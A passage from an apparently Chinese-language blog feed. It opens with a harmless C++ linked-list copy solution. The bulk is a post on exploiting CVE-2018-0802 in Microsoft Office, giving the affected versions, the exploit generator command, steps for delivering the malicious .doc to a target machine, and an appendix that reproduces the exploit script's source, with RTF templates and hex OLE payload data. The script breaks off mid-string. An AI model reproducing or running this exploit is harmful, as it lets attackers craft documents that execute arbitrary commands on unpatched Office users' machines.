class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// Definition for a Node.</span></span><br><span class="line"><span class="comment">class Node {</span></span><br><span class="line"><span class="comment">public:</span></span><br><span class="line"><span class="comment">    int val;</span></span><br><span class="line"><span class="comment">    Node* next;</span></span><br><span class="line"><span class="comment">    Node* random;</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    Node(int _val) {</span></span><br><span class="line"><span class="comment">        val = _val;</span></span><br><span class="line"><span class="comment">        next = NULL;</span></span><br><span class="line"><span class="comment">        random = NULL;</span></span><br><span class="line"><span class="comment">    }</span></span><br><span class="line"><span class="comment">};</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">Node* <span class="title">copyRandomList</span><span class="params">(Node* head)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        <span class="keyword">auto</span> cur=head;</span><br><span class="line">        <span class="comment">//复制节点到后面</span></span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">auto</span> clone=<span class="keyword">new</span> <span class="built_in">Node</span>(cur-&gt;val);</span><br><span class="line">            clone-&gt;next=cur-&gt;next;</span><br><span class="line">            clone-&gt;random=cur-&gt;random;</span><br><span class="line">            cur-&gt;next=clone;</span><br><span class="line">            cur=clone-&gt;next;</span><br><span class="line">        }</span><br><span class="line">         <span class="comment">//处理random指针</span></span><br><span class="line">        cur=head;</span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(cur-&gt;random!=<span class="literal">NULL</span>)</span><br><span class="line">            {</span><br><span class="line">                cur-&gt;next-&gt;random=cur-&gt;random-&gt;next;</span><br><span class="line">            }</span><br><span class="line">            cur=cur-&gt;next-&gt;next;</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">//分离链表</span></span><br><span class="line">        cur=head;</span><br><span class="line">        <span class="keyword">auto</span> cloneHead=cur-&gt;next;</span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="literal">NULL</span>&amp;&amp;cur-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">auto</span> temp=cur-&gt;next;</span><br><span class="line">            cur-&gt;next=cur-&gt;next-&gt;next;</span><br><span class="line">            cur=temp;</span><br><span class="line">            </span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> cloneHead;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Cpp </tag>
            
            <tag> 数据结构 </tag>
            
            <tag> 算法 </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次CVE-2018-0802漏洞的简单利用</title>
      <link href="/posts/63237/"/>
      <url>/posts/63237/</url>
      
        <content type="html"><![CDATA[<p>受影响的版本</p><blockquote><p>Microsoft Office 2007 Service Pack 3</p><p>Microsoft Office 2010 Service Pack 2 (32-bit editions)</p><p>Microsoft Office 2010 Service Pack 2 (64-bit editions)</p><p>Microsoft Office 2013 Service Pack 1 (32-bit editions)</p><p>Microsoft Office 2013 Service Pack 1 (64-bit editions)</p><p>Microsoft Office 2016 (32-bit edition)</p><p>Microsoft Office 2016 (64-bit edition)</p><p>Microsoft Office 2016 Click-to-Run (C2R) for 32-bit editions</p><p>Microsoft Office 2016 Click-to-Run (C2R) for 64-bit editions</p><p>Microsoft Office Compatibility Pack Service Pack 3</p><p>Microsoft Word 2007 Service Pack 3</p><p>Microsoft Word 2010 Service Pack 2 (32-bit editions)</p><p>Microsoft Word 2010 Service Pack 2 (64-bit editions)</p><p>Microsoft Word 2013 RT Service Pack 1 </p><p>Microsoft Word 2013 Service Pack 1 (32-bit editions)</p><p>Microsoft Word 2013 Service Pack 1 (64-bit editions)</p><p>Microsoft Word 2016 (32-bit edition)</p><p>Microsoft Word 2016 (64-bit edition)</p></blockquote><p>这个漏洞需要打了CVE-2017-11882的补丁后才有效。</p><p>首先准备好用于生成利用漏洞的文件</p><p>在这里下载：<a href="https://github.com/Ridter/RTF_11882_0802">https://github.com/Ridter/RTF_11882_0802</a></p><p>或者直接复制<a href="#%E9%99%84%E5%BD%95">附录</a>的内容存为对应文件：</p><p>然后执行：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python RTF_11882_0802.py -c "cmd.exe /c calc.exe" -o test.doc</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/63237/image-20200622204154770.png" alt="image-20200622204154770"></p><p>将文件复制到靶机，我这里为了方便直接复制到kali自带的Apache里面让靶机去下载了。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/63237/image-20200621213913982.png" alt="image-20200621213913982"></p><p>打开刚刚我们生成的文件后就会发现打开word的同时启动了计算器。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/63237/image-20200622204008081.png" alt="image-20200622204008081"></p><h5 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h5><p>RTF_11882_0802.py 的代码</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : Evi1cg</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">See the file 'LICENSE' for copying permission</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">LOGO = <span class="string">R"""</span></span><br><span class="line"><span class="string">      ___                         ___     </span></span><br><span class="line"><span class="string">     /\  \                       /\__\    </span></span><br><span class="line"><span class="string">    /::\  \         ___         /:/ _/_   </span></span><br><span class="line"><span class="string">   /:/\:\__\       /\__\       /:/ /\__\  </span></span><br><span class="line"><span class="string">  /:/ /:/  /      /:/  /      /:/ /:/  /  </span></span><br><span class="line"><span class="string"> /:/_/:/__/___   /:/__/      /:/_/:/  /   </span></span><br><span class="line"><span class="string"> \:\/:::::/  /  /::\  \      \:\/:/  /    </span></span><br><span class="line"><span class="string">  \::/~~/~~~~  /:/\:\  \      \::/__/     </span></span><br><span class="line"><span class="string">   \:\~~\      \/__\:\  \      \:\  \     </span></span><br><span class="line"><span class="string">    \:\__\          \:\__\      \:\__\    </span></span><br><span class="line"><span class="string">     \/__/           \/__/       \/__/ """</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RTF_HEADER = <span class="string">R"""{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fcharset0 Calibri;}}</span></span><br><span class="line"><span class="string">{\*\generator Riched20 6.3.9600}\viewkind4\uc1</span></span><br><span class="line"><span class="string">\pard\sa200\sl276\slmult1\f0\fs22\lang9"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RTF_TRAILER = <span class="string">R"""\par}</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OBJCLASS11882 =<span class="string">R"""{\object\objemb\objupdate{\*\objclass Equation.3}\objw660\objh260{\*\objdata 01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff0900060000000000000000000000010000000100000000000000001000000200000001000000feffffff0000000000000000fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffdffffff04000000fefffffffefffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500ffffffffffffffff0200000002ce020000000000c0000000000000460000000000000000000000008020cea5613cd30103000000000200000000000001004f006c00650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000201ffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000001400000000000000010043006f006d0070004f0062006a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120002010100000003000000ffffffff00000000000000000000000000000000000000000000000000000000000000000000000001000000660000000000000003004f0062006a0049006e0066006f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012000201ffffffff04000000ffffffff000000000000000000000000000000000000000000000000000000000000000000000000030000000600000000000000feffffff02000000fefffffffeffffff050000000600000007000000feffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff010000020800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100feff030a0000ffffffff02ce020000000000c000000000000046170000004d6963726f736f6674204571756174696f6e20332e30000c0000004453204571756174696f6e000b0000004571756174696f6e2e3300f439b271000000000000000000000000000000000000000000000000000000000000000000000000000000000300040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OBJECT_HEADER = <span class="string">R"""{\object\objemb\objupdate{\*\objclass Equation.3}\objw380\objh260{\*\objdata """</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OBJECT_TRAILER = <span class="string">R"""</span></span><br><span class="line"><span class="string">}{\result {\rtlch\fcs1 \af0 \ltrch\fcs0 \dn8\insrsid95542\charrsid95542 {\pict{\*\picprop\shplid1025{\sp{\sn shapeType}{\sv 75}}{\sp{\sn fFlipH}{\sv 0}}</span></span><br><span class="line"><span class="string">{\sp{\sn fFlipV}{\sv 0}}{\sp{\sn fLockAspectRatio}{\sv 1}}{\sp{\sn pictureGray}{\sv 0}}{\sp{\sn pictureBiLevel}{\sv 0}}{\sp{\sn fRecolorFillAsPicture}{\sv 0}}{\sp{\sn fUseShapeAnchor}{\sv 0}}{\sp{\sn fFilled}{\sv 0}}{\sp{\sn fHitTestFill}{\sv 1}}</span></span><br><span class="line"><span class="string">{\sp{\sn fillShape}{\sv 1}}{\sp{\sn fillUseRect}{\sv 0}}{\sp{\sn fNoFillHitTest}{\sv 0}}{\sp{\sn fLine}{\sv 0}}{\sp{\sn fPreferRelativeResize}{\sv 1}}{\sp{\sn fReallyHidden}{\sv 0}}</span></span><br><span class="line"><span class="string">{\sp{\sn fScriptAnchor}{\sv 0}}{\sp{\sn fFakeMaster}{\sv 0}}{\sp{\sn fCameFromImgDummy}{\sv 0}}{\sp{\sn fLayoutInCell}{\sv 1}}}\picscalex100\picscaley100\piccropl0\piccropr0\piccropt0\piccropb0</span></span><br><span class="line"><span class="string">\picw353\pich600\picwgoal200\pichgoal340\wmetafile8\bliptag1846300541\blipupi2307{\*\blipuid 6e0c4f7df03da08a8c6c623556e3c652}0100090000035100000000001200000000000500000009020000000005000000020101000000050000000102ffffff00050000002e0118000000050000000b02</span></span><br><span class="line"><span class="string">00000000050000000c02200240011200000026060f001a00ffffffff000010000000c0ffffffaaffffff00010000ca0100000b00000026060f000c004d61746854797065000040000a00000026060f000a00ffffffff010000000000030000000000}}}}"""</span></span><br><span class="line"></span><br><span class="line">OBJECT_TRAILER11882 =<span class="string">R"""</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004500710075006100740069006F006E0020004E00610074006900760065000000000000000000000000000000000000000000000000000000000000000000000020000200FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000004000000C5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001050000050000000D0000004D45544146494C4550494354003421000035FEFFFF9201000008003421CB010000010009000003C500000002001C00000000000500000009020000000005000000020101000000050000000102FFFFFF00050000002E0118000000050000000B0200000000050000000C02A001201E1200000026060F001A00FFFFFFFF000010000000C0FFFFFFC6FFFFFFE01D0000660100000B00000026060F000C004D61746854797065000020001C000000FB0280FE0000000000009001000000000402001054696D6573204E657720526F6D616E00FEFFFFFF6B2C0A0700000A0000000000040000002D0100000C000000320A600190160A000000313131313131313131310C000000320A6001100F0A000000313131313131313131310C000000320A600190070A000000313131313131313131310C000000320A600110000A000000313131313131313131310A00000026060F000A00FFFFFFFF0100000000001C000000FB021000070000000000BC02000000000102022253797374656D000048008A0100000A000600000048008A01FFFFFFFF7CEF1800040000002D01010004000000F0010000030000000000</span></span><br><span class="line"><span class="string">}{\result {\rtlch\fcs1 \af0 \ltrch\fcs0 \dn8\insrsid95542\charrsid95542 {\pict{\*\picprop\shplid1025{\sp{\sn shapeType}{\sv 75}}{\sp{\sn fFlipH}{\sv 0}}</span></span><br><span class="line"><span class="string">{\sp{\sn fFlipV}{\sv 0}}{\sp{\sn fLockAspectRatio}{\sv 1}}{\sp{\sn pictureGray}{\sv 0}}{\sp{\sn pictureBiLevel}{\sv 0}}{\sp{\sn fRecolorFillAsPicture}{\sv 0}}{\sp{\sn fUseShapeAnchor}{\sv 0}}{\sp{\sn fFilled}{\sv 0}}{\sp{\sn fHitTestFill}{\sv 1}}</span></span><br><span class="line"><span class="string">{\sp{\sn fillShape}{\sv 1}}{\sp{\sn fillUseRect}{\sv 0}}{\sp{\sn fNoFillHitTest}{\sv 0}}{\sp{\sn fLine}{\sv 0}}{\sp{\sn fPreferRelativeResize}{\sv 1}}{\sp{\sn fReallyHidden}{\sv 0}}</span></span><br><span class="line"><span class="string">{\sp{\sn fScriptAnchor}{\sv 0}}{\sp{\sn fFakeMaster}{\sv 0}}{\sp{\sn fCameFromImgDummy}{\sv 0}}{\sp{\sn fLayoutInCell}{\sv 1}}}\picscalex100\picscaley100\piccropl0\piccropr0\piccropt0\piccropb0</span></span><br><span class="line"><span class="string">\picw353\pich600\picwgoal200\pichgoal340\wmetafile8\bliptag1846300541\blipupi2307{\*\blipuid 6e0c4f7df03da08a8c6c623556e3c652}0100090000035100000000001200000000000500000009020000000005000000020101000000050000000102ffffff00050000002e0118000000050000000b02</span></span><br><span class="line"><span class="string">00000000050000000c02200240011200000026060f001a00ffffffff000010000000c0ffffffaaffffff00010000ca0100000b00000026060f000c004d61746854797065000040000a00000026060f000a00ffffffff010000000000030000000000}}}}\par}</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OBJDATA_TEMPLATE = <span class="string">R"""</span></span><br><span class="line"><span class="string">01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1</span></span><br><span class="line"><span class="string">b11ae1000000000000000000000000000000003e000300feff090006000000000000000000000001</span></span><br><span class="line"><span class="string">0000000100000000000000001000000200000001000000feffffff0000000000000000ffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">fffffffffffffffffffffffffffffffffffffffffffffffffffffffdffffff04000000fefffffffe</span></span><br><span class="line"><span class="string">fffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e0074007200790000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000016000500ffffffffffffffff0200000002ce020000000000c0000000000000460000000000</span></span><br><span class="line"><span class="string">000000000000008020cea5613cd30103000000000200000000000001004f006c0065000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000a000201ffffffffffffffffffffffff00000000000000000000000000</span></span><br><span class="line"><span class="string">0000000000000000000000000000000000000000000000000000001400000000000000010043006f</span></span><br><span class="line"><span class="string">006d0070004f0062006a000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000120002010100000003000000ffffffff0000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000010000006600000000</span></span><br><span class="line"><span class="string">00000003004f0062006a0049006e0066006f00000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000012000201ffffffff04000000ff</span></span><br><span class="line"><span class="string">ffffff00000000000000000000000000000000000000000000000000000000000000000000000003</span></span><br><span class="line"><span class="string">0000000600000000000000feffffff02000000fefffffffeffffff050000000600000007000000fe</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffff01000002080000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">0000000000000000000000000000000000000000000000000000000100feff030a0000ffffffff02</span></span><br><span class="line"><span class="string">ce020000000000c000000000000046170000004d6963726f736f6674204571756174696f6e20332e</span></span><br><span class="line"><span 